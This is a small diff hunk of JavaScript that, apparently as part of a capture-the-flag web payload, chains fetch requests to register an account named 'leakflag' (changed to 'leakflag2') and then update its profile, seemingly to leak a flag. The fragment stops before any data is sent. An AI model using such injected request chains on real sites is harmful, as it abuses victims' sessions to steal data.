@@ -3,7 +3,7 @@
     fetch("/register", {
       method: "POST",
       headers: {"Content-Type": "application/x-www-form-urlencoded"},
-      body: "username=leakflag&password=123456&password2=123456"
+      body: "username=leakflag2&password=123456&password2=123456"
     }).then(() => fetch("/profile/update", {
       method: "POST",
       headers: {"Content-Type": "application/x-www-form-urlencoded"},
